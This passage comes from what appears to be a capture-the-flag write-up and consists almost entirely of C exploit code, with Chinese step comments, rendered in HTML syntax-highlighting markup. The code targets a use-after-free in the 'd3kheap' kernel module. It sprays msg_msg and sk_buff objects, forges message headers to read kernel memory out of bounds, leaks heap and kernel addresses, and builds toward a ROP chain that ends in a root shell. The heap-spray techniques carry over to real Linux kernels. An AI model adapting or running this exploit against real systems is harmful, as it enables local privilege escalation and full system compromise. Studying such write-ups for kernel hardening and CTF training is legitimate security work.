class="token punctuation">&#125;</span><span class="token comment">// 构造msg_msg结构，向参数1结构体赋值</span><span class="token keyword">void</span> <span class="token function">buildMsg</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span> <span class="token operator">*</span>msg<span class="token punctuation">,</span> <span class="token class-name">uint64_t</span> m_list_next<span class="token punctuation">,</span>    <span class="token class-name">uint64_t</span> m_list_prev<span class="token punctuation">,</span> <span class="token class-name">uint64_t</span> m_type<span class="token punctuation">,</span> <span class="token class-name">uint64_t</span> m_ts<span class="token punctuation">,</span>     <span class="token class-name">uint64_t</span> next<span class="token punctuation">,</span> <span class="token class-name">uint64_t</span> security<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    msg<span class="token operator">-></span>m_list<span class="token punctuation">.</span>next <span class="token operator">=</span> m_list_next<span class="token punctuation">;</span>    msg<span class="token operator">-></span>m_list<span class="token punctuation">.</span>prev <span class="token operator">=</span> m_list_prev<span class="token punctuation">;</span>    msg<span class="token operator">-></span>m_type <span class="token operator">=</span> m_type<span class="token punctuation">;</span>    msg<span class="token operator">-></span>m_ts <span class="token operator">=</span> m_ts<span class="token punctuation">;</span>    msg<span class="token operator">-></span>next <span class="token operator">=</span> next<span class="token punctuation">;</span>    msg<span class="token operator">-></span>security <span class="token operator">=</span> security<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 喷射sk_buff结构，他附带一个skb_shared_info结构体。向socketpair写来达到分配的目的，喷射大小为0x400，每个socketpair喷射128次</span><span class="token keyword">int</span> <span class="token function">spraySkBuff</span><span class="token punctuation">(</span><span class="token keyword">int</span> sk_socket<span class="token punctuation">[</span>SOCKET_NUM<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> SOCKET_NUM<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> SK_BUFF_NUM<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token comment">// printf("[-] now %d, num %d\n", i, j);</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">write</span><span class="token punctuation">(</span>sk_socket<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> size<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>                <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 释放sk_buff结构，向socketpair读来达到释放的目的</span><span class="token keyword">int</span> <span class="token function">freeSkBuff</span><span class="token punctuation">(</span><span class="token keyword">int</span> sk_socket<span class="token punctuation">[</span>SOCKET_NUM<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> SOCKET_NUM<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> SK_BUFF_NUM<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>sk_socket<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> size<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>                <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 用户态起shell</span><span class="token keyword">void</span> <span class="token function">getRootShell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"failed to gain the root!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[32m\033[1m[+] Succesfully gain the root privilege, trigerring root shell now...\033[0m\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span>         oob_pipe_fd<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span>         sk_sockets<span class="token punctuation">[</span>SOCKET_NUM<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span>         pipe_fd<span class="token punctuation">[</span>PIPE_NUM<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span>         msqid<span class="token punctuation">[</span>MSG_QUEUE_NUM<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span>         victim_qid<span class="token punctuation">,</span> real_qid<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">msg_msg</span>  <span class="token operator">*</span>nearby_msg<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">msg_msg</span>  <span class="token operator">*</span>nearby_msg_prim<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">pipe_buffer</span> <span class="token operator">*</span>pipe_buf_ptr<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">pipe_buf_operations</span> <span class="token operator">*</span>ops_ptr<span class="token punctuation">;</span>    <span class="token class-name">uint64_t</span>    victim_addr<span class="token punctuation">;</span>    <span class="token class-name">uint64_t</span>    kernel_base<span class="token punctuation">;</span>    <span class="token class-name">uint64_t</span>    kernel_offset<span class="token punctuation">;</span>    <span class="token class-name">uint64_t</span>    <span class="token operator">*</span>rop_chain<span class="token punctuation">;</span>    <span class="token keyword">int</span>         rop_idx<span class="token punctuation">;</span>    <span class="token class-name">cpu_set_t</span>   cpu_set<span class="token punctuation">;</span>    <span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/*     * Step.O     * 初始化     */</span>    <span class="token comment">// 绑定单核</span>    <span class="token function">CPU_ZERO</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cpu_set<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">CPU_SET</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>cpu_set<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sched_setaffinity</span><span class="token punctuation">(</span><span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>cpu_set<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>cpu_set<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 创建16对socketpair，描述符存在sk_sockets数组中</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> SOCKET_NUM<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">socketpair</span><span class="token punctuation">(</span>AF_UNIX<span class="token punctuation">,</span> SOCK_STREAM<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> sk_sockets<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>            <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"failed to create socket pair!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        dev_fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/d3kheap"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/*     * Step.1     * msgget 创建 msg 队列     * 使用模块功能添加一个0x400大小堆块     * 喷射msg_msg结构，每次都发送两条消息，一条0x60大小，另一条0x400大小     * 当循环到中途时释放掉之前添加的0x400，之后msgsnd时有极大几率分配到此chunk     */</span>    <span class="token comment">// 创建4096个消息队列</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> MSG_QUEUE_NUM<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>msqid<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">msgget</span><span class="token punctuation">(</span>IPC_PRIVATE<span class="token punctuation">,</span> <span class="token number">0666</span> <span class="token operator">|</span> IPC_CREAT<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>            <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"failed to create msg_queue!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 初始化主消息和副消息</span>    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>primary_msg<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>primary_msg<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>secondary_msg<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>secondary_msg<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 使用模块功能分配0x400堆块</span>    <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 喷射0x60和0x400堆块，在中途释放掉模块申请的0x400,使后续的副消息堆块进行占用，那么这个堆块内容就是我们可控的了</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> MSG_QUEUE_NUM<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>primary_msg<span class="token punctuation">.</span>mtext<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> MSG_TAG<span class="token punctuation">;</span>        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>primary_msg<span class="token punctuation">.</span>mtext<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">writeMsg</span><span class="token punctuation">(</span>msqid<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>primary_msg<span class="token punctuation">,</span>                 <span class="token keyword">sizeof</span><span class="token punctuation">(</span>primary_msg<span class="token punctuation">)</span><span class="token punctuation">,</span> PRIMARY_MSG_TYPE<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>            <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"failed to send primary msg!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>secondary_msg<span class="token punctuation">.</span>mtext<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> MSG_TAG<span class="token punctuation">;</span>        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>secondary_msg<span class="token punctuation">.</span>mtext<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">writeMsg</span><span class="token punctuation">(</span>msqid<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>secondary_msg<span class="token punctuation">,</span>                 <span class="token keyword">sizeof</span><span class="token punctuation">(</span>secondary_msg<span class="token punctuation">)</span><span class="token punctuation">,</span> SECONDARY_MSG_TYPE<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>            <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"failed to send secondary msg!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">1024</span><span class="token punctuation">)</span>            <span class="token function">del</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/*     * Step.2     * 再次释放这个可控堆块，让它进入free list,     * 然后我们构造一个假的msg_msg结构体，把m_ts成员设置成0x400，它其实就是大小，其他的随意     * 接下来再次喷射sk_buff，让sk_buff占用，并将我们构造的msg_msg写入到刚才释放的堆块中     */</span>    <span class="token function">del</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 喷射sk_buff，使用sk_buff占用这个被释放的0x400堆块，并写入一个构造好的msg_msg结构</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] spray sk_buff..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">buildMsg</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span> <span class="token operator">*</span><span class="token punctuation">)</span>fake_secondary_msg<span class="token punctuation">,</span>             <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"unr4v31."</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"unr4v31."</span><span class="token punctuation">,</span>             <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"unr4v31."</span><span class="token punctuation">,</span> SECONDARY_MSG_SIZE<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">spraySkBuff</span><span class="token punctuation">(</span>sk_sockets<span class="token punctuation">,</span> fake_secondary_msg<span class="token punctuation">,</span>             <span class="token keyword">sizeof</span><span class="token punctuation">(</span>fake_secondary_msg<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"failed to spray sk_buff!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 使用msgrcv来读取所有的msg队列中的内容，并添加MSG_COPY标识位，避免unlink时错误的链表指针导致内核崩溃</span>    victim_qid <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> MSG_QUEUE_NUM<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token comment">// 由于我们修改过msg_msg结构体，所以它无法被读取出来，利用这一点可以判断出我们命中队列的下标</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">peekMsg</span><span class="token punctuation">(</span>msqid<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>secondary_msg<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>secondary_msg<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] victim qid: %d\n"</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>            victim_qid <span class="token operator">=</span> i<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>victim_qid <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"failed to make the UAF in msg queue!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 然后释放掉sk_buff</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">freeSkBuff</span><span class="token punctuation">(</span>sk_sockets<span class="token punctuation">,</span> fake_secondary_msg<span class="token punctuation">,</span>             <span class="token keyword">sizeof</span><span class="token punctuation">(</span>fake_secondary_msg<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"failed to release sk_buff!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">/*     * Step.3     * 接下来我们要重新把这些堆块申请回来，修改它们的m_ts成员为0x1000-0x30，这样就可以刚好申请到一页大小     * 有了m_ts成员之后，我们就可以通过它来进行越界读取，找出堆喷命中的UAF堆块     */</span>    <span class="token function">buildMsg</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span> <span class="token operator">*</span><span class="token punctuation">)</span>fake_secondary_msg<span class="token punctuation">,</span>             <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"unr4v31."</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"unr4v31."</span><span class="token punctuation">,</span>             VICTIM_MSG_TYPE<span class="token punctuation">,</span> <span class="token number">0x1000</span> <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">spraySkBuff</span><span class="token punctuation">(</span>sk_sockets<span class="token punctuation">,</span> fake_secondary_msg<span class="token punctuation">,</span>             <span class="token keyword">sizeof</span><span class="token punctuation">(</span>fake_secondary_msg<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"failed to spray sk_buff!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// oob_msg读取的数据会保存到oob_msg</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">peekMsg</span><span class="token punctuation">(</span>msqid<span class="token punctuation">[</span>victim_qid<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>oob_msg<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>oob_msg<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"failed to read victim msg!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>oob_msg<span class="token punctuation">.</span>mtext<span class="token punctuation">[</span>SECONDARY_MSG_SIZE<span class="token punctuation">]</span> <span class="token operator">!=</span> MSG_TAG<span class="token punctuation">)</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"failed to rehit the UAF object!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    nearby_msg <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span><span class="token operator">*</span><span class="token punctuation">)</span>             <span class="token operator">&amp;</span>oob_msg<span class="token punctuation">.</span>mtext<span class="token punctuation">[</span><span class="token punctuation">(</span>SECONDARY_MSG_SIZE<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[32m\033[1m[+] addr of primary msg of msg nearby victim: \033[0m%llx\n"</span><span class="token punctuation">,</span>             nearby_msg<span class="token operator">-></span>m_list<span class="token punctuation">.</span>prev<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">freeSkBuff</span><span class="token punctuation">(</span>sk_sockets<span class="token punctuation">,</span> fake_secondary_msg<span class="token punctuation">,</span>             <span class="token keyword">sizeof</span><span class="token punctuation">(</span>fake_secondary_msg<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"failed to release sk_buff!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">buildMsg</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span> <span class="token operator">*</span><span class="token punctuation">)</span>fake_secondary_msg<span class="token punctuation">,</span>             <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"unr4v31."</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"unr4v31."</span><span class="token punctuation">,</span>             VICTIM_MSG_TYPE<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>oob_msg<span class="token punctuation">.</span>mtext<span class="token punctuation">)</span><span class="token punctuation">,</span>             nearby_msg<span class="token operator">-></span>m_list<span class="token punctuation">.</span>prev <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">spraySkBuff</span><span class="token punctuation">(</span>sk_sockets<span class="token punctuation">,</span> fake_secondary_msg<span class="token punctuation">,</span>             <span class="token keyword">sizeof</span><span class="token punctuation">(</span>fake_secondary_msg<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"failed to spray sk_buff!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">peekMsg</span><span class="token punctuation">(</span>msqid<span class="token punctuation">[</span>victim_qid<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>oob_msg<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>oob_msg<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"failed to read victim msg!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>oob_msg<span class="token punctuation">.</span>mtext<span class="token punctuation">[</span><span class="token number">0x1000</span><span class="token punctuation">]</span> <span class="token operator">!=</span> MSG_TAG<span class="token punctuation">)</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"failed to rehit the UAF object!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// cal the addr of UAF obj by the header we just read out</span>    nearby_msg_prim <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span><span class="token operator">*</span><span class="token punctuation">)</span>             <span class="token operator">&amp;</span>oob_msg<span class="token punctuation">.</span>mtext<span class="token punctuation">[</span><span class="token number">0x1000</span> <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    victim_addr <span class="token operator">=</span> nearby_msg_prim<span class="token operator">-></span>m_list<span class="token punctuation">.</span>next <span class="token operator">-</span> <span class="token number">0x400</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[32m\033[1m[+] addr of msg next to victim: \033[0m%llx\n"</span><span class="token punctuation">,</span>             nearby_msg_prim<span class="token operator">-></span>m_list<span class="token punctuation">.</span>next<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[32m\033[1m[+] addr of msg UAF object: \033[0m%llx\n"</span><span class="token punctuation">,</span> victim_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/*     * Step.4     * 修复msg_msg结构体，释放后喷射pipe_buffer结构体，泄露内核地址     */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">freeSkBuff</span><span class="token punctuation">(</span>sk_sockets<span class="token punctuation">,</span> fake_secondary_msg<span class="token punctuation">,</span>             <span class="token keyword">sizeof</span><span class="token punctuation">(</span>fake_secondary_msg<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"failed to release sk_buff!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">memset</span><span class="token punctuation">(</span>fake_secondary_msg<span class="token punctuation">,</span> 